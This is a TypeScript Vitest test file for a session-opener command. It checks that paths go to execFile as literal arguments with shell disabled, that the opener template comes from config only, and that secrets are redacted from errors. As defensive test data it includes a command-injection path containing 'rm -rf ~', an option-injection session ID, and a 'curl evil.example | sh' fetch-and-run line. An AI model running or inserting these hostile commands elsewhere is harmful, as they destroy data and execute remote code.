import { describe, expect, it, vi } from "vitest";
import { openSession } from "../../src/commands/open-session.ts";

// Contract pinned for M4.08 (consumed by the M4.03 command service):
//   openSession(request, { config, execFile }) => Promise<OpenSessionResult>
//   request:  { sessionId: string; cwd: string }  (the only things a caller supplies)
//   config:   { sessionOpener: string[] | null }  (the loaded engine config; the only template source)
//   execFile: (file, args, options) => Promise<unknown>  (injected; options.shell is always false)
//   result:   { status: "copy-only" | "opened", sessionId, cwd }
//           | { status: "failed", reason: "invalid-value" | "spawn-failed", message, sessionId, cwd }
//   It never throws for a bad value or a spawn failure.

const NASTY_CWD = "/tmp/; rm -rf ~ $(whoami) `id` | & > \"' *";
const request = { sessionId: "sess-1", cwd: "/Users/dev/repo" };

function fakeExecFile() {
  return vi.fn<
    (file: string, args: string[], options: Record<string, unknown>) => Promise<unknown>
  >(async () => ({ stdout: "", stderr: "" }));
}

describe("openSession: copy-only default", () => {
  it("returns the session ID and working directory to copy, and runs nothing, when no opener is configured", async () => {
    const execFile = fakeExecFile();
    const result = await openSession(request, { config: { sessionOpener: null }, execFile });
    expect(result).toEqual({ status: "copy-only", sessionId: "sess-1", cwd: "/Users/dev/repo" });
    expect(execFile).not.toHaveBeenCalled();
  });
});

describe("openSession: configured opener", () => {
  it("runs the program once with an argument array and reports the session as opened", async () => {
    const execFile = fakeExecFile();
    const result = await openSession(request, {
      config: { sessionOpener: ["/usr/bin/open", "-a", "Terminal", "{cwd}", "--id={sessionId}"] },
      execFile,
    });
    expect(execFile).toHaveBeenCalledTimes(1);
    const [file, args] = execFile.mock.calls[0] ?? [];
    expect(file).toBe("/usr/bin/open");
    expect(args).toEqual(["-a", "Terminal", "/Users/dev/repo", "--id=sess-1"]);
    expect(result).toEqual({ status: "opened", sessionId: "sess-1", cwd: "/Users/dev/repo" });
  });

  it("passes shell metacharacters in the cwd literally, as one argument, never through a shell", async () => {
    const execFile = fakeExecFile();
    await openSession(
      { sessionId: "sess-1", cwd: NASTY_CWD },
      { config: { sessionOpener: ["open", "-a", "Terminal", "{cwd}", "--dir={cwd}"] }, execFile },
    );
    expect(execFile).toHaveBeenCalledTimes(1);
    const [file, args, options] = execFile.mock.calls[0] ?? [];
    expect(file).toBe("open");
    expect(Array.isArray(args)).toBe(true);
    expect(args).toEqual(["-a", "Terminal", NASTY_CWD, `--dir=${NASTY_CWD}`]);
    expect(options?.shell).toBe(false);
    expect(options?.shell).not.toBe(true);
  });
});

describe("openSession: values the opener rejects", () => {
  it("returns a failed outcome without running anything when the session ID could act as an option", async () => {
    const execFile = fakeExecFile();
    const result = await openSession(
      { sessionId: "--evil", cwd: "/Users/dev/repo" },
      { config: { sessionOpener: ["open", "-a", "Terminal", "{cwd}", "{sessionId}"] }, execFile },
    );
    expect(execFile).not.toHaveBeenCalled();
    expect(result).toMatchObject({ status: "failed", reason: "invalid-value" });
    expect(result).toHaveProperty("message", expect.any(String));
  });

  it("returns a failed outcome without throwing when the cwd is not an absolute path", async () => {
    const execFile = fakeExecFile();
    const result = await openSession(
      { sessionId: "sess-1", cwd: "relative/dir" },
      { config: { sessionOpener: ["open", "{cwd}"] }, execFile },
    );
    expect(execFile).not.toHaveBeenCalled();
    expect(result).toMatchObject({ status: "failed", reason: "invalid-value" });
  });
});

describe("openSession: the template comes only from engine config", () => {
  it("takes no template from the request: extra template and opener fields are ignored (config wins)", async () => {
    const execFile = fakeExecFile();
    const hostile = {
      ...request,
      template: ["/bin/sh", "-c", "curl evil.example | sh"],
      opener: ["/bin/sh", "-c", "curl evil.example | sh"],
      sessionOpener: ["/bin/sh", "-c", "curl evil.example | sh"],
    };
    await openSession(hostile, { config: { sessionOpener: ["open", "{cwd}"] }, execFile });
    expect(execFile).toHaveBeenCalledTimes(1);
    expect(execFile.mock.calls[0]?.[0]).toBe("open");
    expect(execFile.mock.calls[0]?.[1]).toEqual(["/Users/dev/repo"]);
  });

  it("stays copy-only when config has no opener, even if the request carries one", async () => {
    const execFile = fakeExecFile();
    const hostile = { ...request, opener: ["/usr/bin/open", "{cwd}"], template: ["/usr/bin/open"] };
    const result = await openSession(hostile, { config: { sessionOpener: null }, execFile });
    expect(execFile).not.toHaveBeenCalled();
    expect(result).toEqual({ status: "copy-only", sessionId: "sess-1", cwd: "/Users/dev/repo" });
  });
});

describe("openSession: spawn failures", () => {
  it("maps an ENOENT from execFile to a failed outcome with a non-secret message, and does not throw", async () => {
    const secret = "tok_SECRET_123";
    const execFile = vi.fn(async () => {
      throw Object.assign(new Error(`spawn /opt/opener ENOENT --token=${secret} ${request.cwd}`), {
        code: "ENOENT",
      });
    });
    const result = await openSession(request, {
      config: { sessionOpener: ["/opt/opener", "--token=tok_SECRET_123", "{cwd}"] },
      execFile,
    });
    expect(execFile).toHaveBeenCalledTimes(1);
    expect(result).toMatchObject({ status: "failed", reason: "spawn-failed" });
    const message = (result as { message: string }).message;
    expect(message).toMatch(/ENOENT/);
    expect(message).not.toContain(secret);
    expect(message).not.toContain(request.cwd);
  });
});
